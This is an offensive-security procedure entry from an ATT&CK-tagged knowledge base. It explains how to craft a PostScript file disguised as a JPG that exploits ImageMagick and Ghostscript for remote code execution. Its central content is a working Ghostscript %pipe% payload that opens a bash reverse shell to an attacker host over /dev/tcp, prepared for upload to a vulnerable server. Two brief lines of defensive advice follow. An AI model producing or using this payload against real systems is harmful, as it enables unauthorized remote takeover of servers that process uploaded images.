---
tags:
  - rce
  - payload-crafting
  - postscript
type: procedure
tools:
  - '[[tools/ImageMagick]]'
  - '[[tools/Ghostscript]]'
  - '[[tools/Netcat]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/postscript-payload-rce]]'
  - '[[commands/bash-reverse-shell]]'
  - '[[commands/ls-directory-list]]'
  - '[[commands/whoami-user-identification]]'
  - '[[commands/cat-hosts-file]]'
platforms:
  - Linux
techniques:
  - '[[Exploit Public-Facing Application]]'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
id: 217e3446-6ada-4ddb-89ad-6d52e6f5052b
created_at: '2025-12-11T06:10:33.236Z'
updated_at: '2025-12-11T06:10:33.236Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[TA0001]]'
mitre_techniques:
  - '[[T1190]]'
---
# Create Malicious Postscript Payload

## Summary

This procedure involves crafting a malicious Postscript file disguised as a JPG to exploit vulnerabilities in ImageMagick and Ghostscript, enabling arbitrary command execution for a reverse shell.

## Description

The payload undefines setpagedevice, uses legal to restore context, and sets OutputFile to pipe a bash reverse shell command. It targets improperly patched ImageMagick instances that allow Postscript to trigger Ghostscript without disabling relevant formats in policy.xml. Expected outcome is a file ready for upload to trigger RCE.

## Requirements

1. Text editor or command line to write the payload.
2. Knowledge of attacker's IP and port for reverse shell.
3. Target vulnerable to ImageMagick processing.

## Defense

Defensive measures and detection strategies:

- Properly configure ImageMagick policy.xml to disable EPS, PS, PDF, XPS.
- Monitor file uploads for suspicious extensions or content.

## Objectives

1. Create a payload that triggers Ghostscript execution.
2. Embed a reverse shell command.
3. Prepare for upload to exploit RCE.

## Instructions

### Step 1: Write Postscript Code

**Context**: Construct the Postscript payload to execute a reverse shell via Ghostscript.

**Command** ([[commands/postscript-payload-rce]]):
```bash
%!PS\nuserdict /setpagedevice undef\nlegal\n{ null restore } stopped { pop } if\nlegal\nmark /OutputFile (%pipe%bash -c 'bash -i >& /dev/tcp/███/8080 0>&1') currentdevice putdeviceprops
```

> This sets up the payload to pipe commands through Ghostscript, establishing a reverse shell to the specified IP and port.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques



## Commands Used

- [[commands/postscript-payload-rce]]

## Tools Used

- [[tools/Ghostscript]]

## Tags

- [[commands/postscript-payload-rce]]
- [[payload-crafting]]
